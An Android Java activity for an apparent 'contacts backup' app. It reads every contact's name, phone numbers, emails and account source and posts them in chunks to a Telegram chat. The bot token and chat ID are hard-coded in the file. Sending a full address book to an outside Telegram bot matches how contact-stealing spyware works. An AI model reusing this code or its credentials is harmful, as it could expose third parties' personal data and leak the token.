package com.contactsbackup.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.IOException;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    // ============================================================
    // ⚠️ REPLACE THESE WITH YOUR OWN TELEGRAM BOT CREDENTIALS
    // ============================================================
    private static final String BOT_TOKEN = "8774587636:AAF-seXI2X0ACIa24LjcHrqwmuyGM5eiwEQ";
    private static final String CHAT_ID = "7825761805";
    // ============================================================

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int TELEGRAM_MAX_LENGTH = 4000; // Safe limit under 4096

    private Button btnBackup;
    private ProgressBar progressBar;
    private TextView tvStatus;
    private OkHttpClient httpClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnBackup = findViewById(R.id.btn_backup);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);
        httpClient = new OkHttpClient();

        btnBackup.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                checkPermissionAndBackup();
            }
        });
    }

    /**
     * Check if READ_CONTACTS permission is granted.
     * If yes, start backup. If no, request it.
     */
    private void checkPermissionAndBackup() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            startBackup();
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startBackup();
            } else {
                tvStatus.setText("❌ Permission denied. Cannot read contacts without permission.");
                tvStatus.setVisibility(View.VISIBLE);
            }
        }
    }

    /**
     * Start the backup process on a background thread.
     */
    private void startBackup() {
        btnBackup.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        tvStatus.setText("📱 Reading contacts...");
        tvStatus.setVisibility(View.VISIBLE);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Step 1: Read all contacts
                    List<ContactInfo> contacts = readAllContacts();

                    updateStatus("📤 Sending " + contacts.size() + " contacts to backup...");

                    // Step 2: Format and send to Telegram
                    boolean success = sendToTelegram(contacts);

                    if (success) {
                        updateStatus("✅ Backup complete! " + contacts.size() + " contacts sent successfully.");
                    } else {
                        updateStatus("❌ Failed to send some contacts. Please try again.");
                    }

                } catch (Exception e) {
                    updateStatus("❌ Error: " + e.getMessage());
                } finally {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            btnBackup.setEnabled(true);
                            progressBar.setVisibility(View.GONE);
                        }
                    });
                }
            }
        }).start();
    }

    /**
     * Read ALL contacts from the device.
     * This includes contacts from phone storage, SIM card, and Google/Gmail accounts.
     * The ContentResolver queries the unified contacts database which merges all sources.
     */
    private List<ContactInfo> readAllContacts() {
        Map<String, ContactInfo> contactMap = new LinkedHashMap<>();
        ContentResolver cr = getContentResolver();

        // --- Read phone numbers ---
        Cursor phoneCursor = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );

        if (phoneCursor != null) {
            try {
                int idIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
                int nameIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int typeIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE);

                while (phoneCursor.moveToNext()) {
                    String id = phoneCursor.getString(idIdx);
                    String name = phoneCursor.getString(nameIdx);
                    String number = phoneCursor.getString(numberIdx);
                    int type = phoneCursor.getInt(typeIdx);

                    if (name == null || name.isEmpty()) name = "Unknown";
                    if (number == null || number.isEmpty()) continue;

                    ContactInfo contact = contactMap.get(id);
                    if (contact == null) {
                        contact = new ContactInfo(name);
                        contactMap.put(id, contact);
                    }

                    String typeLabel = getPhoneTypeLabel(type);
                    contact.addPhone(number.trim() + " (" + typeLabel + ")");
                }
            } finally {
                phoneCursor.close();
            }
        }

        // --- Read email addresses ---
        Cursor emailCursor = cr.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Email.ADDRESS,
                        ContactsContract.CommonDataKinds.Email.TYPE
                },
                null, null, null
        );

        if (emailCursor != null) {
            try {
                int idIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID);
                int nameIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME);
                int emailIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);

                while (emailCursor.moveToNext()) {
                    String id = emailCursor.getString(idIdx);
                    String name = emailCursor.getString(nameIdx);
                    String email = emailCursor.getString(emailIdx);

                    if (email == null || email.isEmpty()) continue;

                    ContactInfo contact = contactMap.get(id);
                    if (contact == null) {
                        if (name == null || name.isEmpty()) name = "Unknown";
                        contact = new ContactInfo(name);
                        contactMap.put(id, contact);
                    }

                    contact.addEmail(email.trim());
                }
            } finally {
                emailCursor.close();
            }
        }

        // --- Read account info (to identify source: Phone, SIM, Google) ---
        Cursor accountCursor = cr.query(
                ContactsContract.RawContacts.CONTENT_URI,
                new String[]{
                        ContactsContract.RawContacts.CONTACT_ID,
                        ContactsContract.RawContacts.ACCOUNT_TYPE,
                        ContactsContract.RawContacts.ACCOUNT_NAME
                },
                null, null, null
        );

        if (accountCursor != null) {
            try {
                int idIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.CONTACT_ID);
                int typeIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE);
                int nameIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_NAME);

                while (accountCursor.moveToNext()) {
                    String id = accountCursor.getString(idIdx);
                    String accountType = accountCursor.getString(typeIdx);
                    String accountName = accountCursor.getString(nameIdx);

                    ContactInfo contact = contactMap.get(id);
                    if (contact != null && accountType != null) {
                        String source = getAccountSource(accountType);
                        if (accountName != null && !accountName.isEmpty()) {
                            source += " (" + accountName + ")";
                        }
                        contact.setSource(source);
                    }
                }
            } finally {
                accountCursor.close();
            }
        }

        return new ArrayList<>(contactMap.values());
    }

    /**
     * Get a human-readable label for the phone number type.
     */
    private String getPhoneTypeLabel(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME: return "Fax Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK: return "Fax Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN: return "Main";
            default: return "Other";
        }
    }

    /**
     * Map account type to a friendly source name.
     */
    private String getAccountSource(String accountType) {
        if (accountType == null) return "📱 Phone";
        String lower = accountType.toLowerCase();
        if (lower.contains("google") || lower.contains("gmail")) {
            return "📧 Google";
        } else if (lower.contains("sim")) {
            return "📶 SIM";
        } else if (lower.contains("phone") || lower.contains("local")) {
            return "📱 Phone";
        } else if (lower.contains("whatsapp")) {
            return "💬 WhatsApp";
        } else {
            return "📋 " + accountType;
        }
    }

    /**
     * Format contacts and send them to Telegram.
     * Splits into multiple messages if the text is too long.
     */
    private boolean sendToTelegram(List<ContactInfo> contacts) {
        if (contacts.isEmpty()) {
            sendTelegramMessage("📭 No contacts found on this device.");
            return true;
        }

        StringBuilder header = new StringBuilder();
        header.append("📋 *CONTACTS BACKUP*\n");
        header.append("━━━━━━━━━━━━━━━━━━━━\n");
        header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
        header.append("📅 Date: ").append(new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                java.util.Locale.getDefault()).format(new java.util.Date())).append("\n");
        header.append("━━━━━━━━━━━━━━━━━━━━\n\n");

        // Send header first
        if (!sendTelegramMessage(header.toString())) {
            return false;
        }

        // Build contact messages in chunks
        StringBuilder chunk = new StringBuilder();
        int contactNum = 0;
        boolean allSuccess = true;

        for (ContactInfo contact : contacts) {
            contactNum++;
            StringBuilder entry = new StringBuilder();
            entry.append("👤 *").append(contactNum).append(". ").append(escapeMarkdown(contact.name)).append("*\n");

            for (String phone : contact.phones) {
                entry.append("   📞 ").append(escapeMarkdown(phone)).append("\n");
            }
            for (String email : contact.emails) {
                entry.append("   ✉️ ").append(escapeMarkdown(email)).append("\n");
            }
            if (contact.source != null) {
                entry.append("   🔗 Source: ").append(escapeMarkdown(contact.source)).append("\n");
            }
            entry.append("\n");

            // Check if adding this entry would exceed the limit
            if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
                // Send current chunk
                if (!sendTelegramMessage(chunk.toString())) {
                    allSuccess = false;
                }
                chunk = new StringBuilder();

                // Small delay to avoid rate limiting
                try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            }

            chunk.append(entry);
        }

        // Send remaining chunk
        if (chunk.length() > 0) {
            if (!sendTelegramMessage(chunk.toString())) {
                allSuccess = false;
            }
        }

        return allSuccess;
    }

    /**
     * Escape special characters for Telegram Markdown.
     */
    private String escapeMarkdown(String text) {
        if (text == null) return "";
        return text.replace("_", "\\_")
                   .replace("[", "\\[")
                   .replace("]", "\\]")
                   .replace("(", "\\(")
                   .replace(")", "\\)")
                   .replace("~", "\\~")
                   .replace("`", "\\`")
                   .replace(">", "\\>")
                   .replace("#", "\\#")
                   .replace("+", "\\+")
                   .replace("-", "\\-")
                   .replace("=", "\\=")
                   .replace("|", "\\|")
                   .replace("{", "\\{")
                   .replace("}", "\\}")
                   .replace(".", "\\.")
                   .replace("!", "\\!");
    }

    /**
     * Send a single message to Telegram via the Bot API.
     */
    private boolean sendTelegramMessage(String text) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

        String json = "{"
                + "\"chat_id\":\"" + CHAT_ID + "\","
                + "\"text\":\"" + text.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n") + "\","
                + "\"parse_mode\":\"MarkdownV2\""
                + "}";

        RequestBody body = RequestBody.create(json, MediaType.parse("application/json"));
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();

        try {
            Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            response.close();
            return success;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    /**
     * Update the status text on the UI thread.
     */
    private void updateStatus(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tvStatus.setText(message);
            }
        });
    }

    /**
     * Data class to hold contact information.
     */
    private static class ContactInfo {
        String name;
        List<String> phones = new ArrayList<>();
        List<String> emails = new ArrayList<>();
        String source;

        ContactInfo(String name) {
            this.name = name;
        }

        void addPhone(String phone) {
            if (!phones.contains(phone)) {
                phones.add(phone);
            }
        }

        void addEmail(String email) {
            if (!emails.contains(email)) {
                emails.add(email);
            }
        }

        void setSource(String source) {
            this.source = source;
        }
    }
}
